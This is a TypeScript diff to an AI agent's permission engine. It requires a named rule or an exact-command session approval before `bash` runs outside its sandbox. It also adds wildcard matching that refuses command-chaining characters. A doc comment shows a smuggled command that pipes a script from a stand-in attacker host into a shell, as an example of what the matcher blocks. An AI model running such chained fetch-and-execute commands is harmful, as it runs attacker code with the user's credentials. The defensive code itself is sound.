@@ -7,7 +7,8 @@
 //   3. the first rule in configuration that matches, which can make it stricter or looser;
 //   4. a session allow, which turns an ask into an allow;
 //   5. the floor, last, which configuration can never lower: production writes, an unknown tool allowed by a wildcard,
-//      a call that needs a screen when there is none, and a file tool aimed at a protected path.
+//      `bash` run outside its sandbox without a rule that names the command, a call that needs a screen when there is
+//      none, and a file tool aimed at a protected path.
 import { matchesName } from "./classify.ts";
 import type {
     ApprovalKind,
@@ -31,6 +32,8 @@ export interface DecidedCall {
     effect: Effect;
     atLeast?: "ask" | "deny";
     approval?: ApprovalKind;
+    /** The `command` the call carries, for the rules that match on one. */
+    command?: string;
     /** True when nothing classified the call, so the unknown default applies. */
     unknown: boolean;
 }
@@ -54,7 +57,7 @@ export interface Verdict {
     /** The screen a rule or the tool chose for asking. */
     approval?: ApprovalKind;
     /** What the floor changed, when it did. */
-    floor?: "production-write" | "unknown-tool" | "no-screen" | "protected-path";
+    floor?: "production-write" | "unknown-tool" | "outside-needs-rule" | "no-screen" | "protected-path";
     /** A plain sentence for the model, set when the decision is deny. */
     reason?: string;
 }
@@ -68,10 +71,36 @@ const TABLE: Readonly<Record<EnvironmentKind, Readonly<Record<Effect, Decision>>
 
 const STRICTNESS: Readonly<Record<Decision, number>> = { allow: 0, ask: 1, deny: 2 };
 
+/** `bash` run outside its sandbox: a call that gets the user's credentials and full network. */
+export function isOutside(call: Pick<DecidedCall, "tool" | "action">): boolean {
+    return call.tool === "bash" && call.action === "outside";
+}
+
 /** The key under which "Allow for this session" is remembered. It includes the environment, so approving a deploy to
- *  one test environment does not approve a deploy to another. */
-export function sessionKey(call: Pick<DecidedCall, "tool" | "action" | "environment">): string {
-    return JSON.stringify([call.tool, call.action ?? null, call.environment]);
+ *  one test environment does not approve a deploy to another. A command run outside the sandbox is remembered by its
+ *  exact text, so approving one command approves no other. */
+export function sessionKey(call: Pick<DecidedCall, "tool" | "action" | "environment" | "command">): string {
+    const exact = isOutside(call) ? [call.command ?? null] : [];
+    return JSON.stringify([call.tool, call.action ?? null, call.environment, ...exact]);
+}
+
+/**
+ * Whether a command matches a rule's pattern. `*` stands for any run of characters that is not a way to chain another
+ * command: not `;`, `&`, `|`, `<`, `>`, a backquote, `$(` or a line break. So the pattern `docker compose *` allows
+ * `docker compose up -d` and not `docker compose up; curl evil.example | sh`. A command that holds such a character
+ * matches only a pattern that holds the same character.
+ */
+export function commandMatches(pattern: string, command: string): boolean {
+    const source = pattern
+        .split("*")
+        .map((part) => part.replace(/[.+?^${}()|[\]\\]/g, "\\$&"))
+        .join("(?:(?!\\$\\()[^;&|<>`\\r\\n])*");
+    return new RegExp(`^${source}$`).test(command);
+}
+
+/** A pattern made only of wildcards and spaces names nothing: it would match every command. */
+export function namesNothing(pattern: string): boolean {
+    return pattern.replace(/[*\s]/g, "") === "";
 }
 
 /** Whether a rule applies to a call. A rule that leaves out `action`, `environment` or `effect` applies to any. */
@@ -80,7 +109,21 @@ export function ruleMatches(rule: Rule, call: DecidedCall): boolean {
     if (rule.action !== undefined && rule.action !== call.action) return false;
     if (rule.environment !== undefined && rule.environment !== call.environment) return false;
     if (rule.effect !== undefined && rule.effect !== call.effect) return false;
+    if (rule.command !== undefined && (call.command === undefined || !commandMatches(rule.command, call.command))) {
+        return false;
+    }
     return true;
+}
+
+/**
+ * Whether a rule is one that may allow `bash` to run outside its sandbox: it names the tool `bash` exactly, the action
+ * `outside`, and a command pattern that names something. A wildcard tool, a missing action or command, or a pattern made
+ * of wildcards never does.
+ */
+export function namesOutsideCommand(rule: Rule): boolean {
+    return (
+        rule.tool === "bash" && rule.action === "outside" && rule.command !== undefined && !namesNothing(rule.command)
+    );
 }
 
 export function decide(input: DecideInput): Verdict {
@@ -125,6 +168,20 @@ export function decide(input: DecideInput): Verdict {
         decision = "ask";
         source = "floor";
         floor = "unknown-tool";
+    }
+    // Running outside the sandbox is allowed without asking only by a rule that names the command, or by the user's
+    // answer for this exact command. Not by the table, a tool's own default, a wildcard or a rule with no command.
+    if (isOutside(call) && decision === "allow") {
+        const named = source === "rule" && decidingRule !== undefined && namesOutsideCommand(decidingRule);
+        if (!named && source !== "session") {
+            if (input.sessionAllows.has(sessionKey(call))) {
+                source = "session";
+            } else {
+                decision = "ask";
+                source = "floor";
+                floor = "outside-needs-rule";
+            }
+        }
     }
     if (decision === "ask" && !input.hasUI) {
         decision = "deny";
